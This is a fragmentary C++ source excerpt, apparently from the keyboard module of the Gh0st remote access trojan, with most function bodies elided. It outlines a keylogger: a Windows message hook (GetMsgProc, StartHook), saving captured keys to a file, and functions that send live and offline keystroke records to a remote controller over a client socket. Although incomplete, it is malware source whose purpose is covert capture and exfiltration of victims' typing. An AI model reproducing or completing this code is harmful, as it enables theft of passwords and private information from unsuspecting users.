...
TShared*	CGh0stKeyboardManager::m_pTShared = NULL;
HANDLE		CGh0stKeyboardManager::m_hMapping_File = NULL;
HINSTANCE	CGh0stKeyboardManager::g_hInstance = NULL;
DWORD		CGh0stKeyboardManager::m_dwLastMsgTime = GetTickCount();
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CGh0stKeyboardManager::CGh0stKeyboardManager(CClientSocket *pClient) : CManager(pClient)
{
	g_bSignalHook = true;
...
CGh0stKeyboardManager::~CGh0stKeyboardManager()
{

}

void CGh0stKeyboardManager::SaveToFile(const char *lpBuffer)
{
...
void CGh0stKeyboardManager::SaveInfo(const char *lpBuffer)
{
	if (lpBuffer == NULL)
		return;
...
LRESULT CALLBACK CGh0stKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	MSG*	pMsg;
	char	strChar[2];
	char	KeyName[20];
...
void CGh0stKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
...
bool CGh0stKeyboardManager::Initialization()
{
...
bool CGh0stKeyboardManager::StartHook()
{
	if (!Initialization())
		return false;
...
void CGh0stKeyboardManager::StopHook()
{
	if (m_pTShared->hGetMsgHook != NULL)
...
int CGh0stKeyboardManager::sendStartKeyBoard()
{
	BYTE	bToken[2];
...
int CGh0stKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	int nRet = -1;
...
int CGh0stKeyboardManager::sendOfflineRecord()
{
	int		nRet = 0;
	DWORD	dwSize = 0;
	DWORD	dwBytesRead = 0;
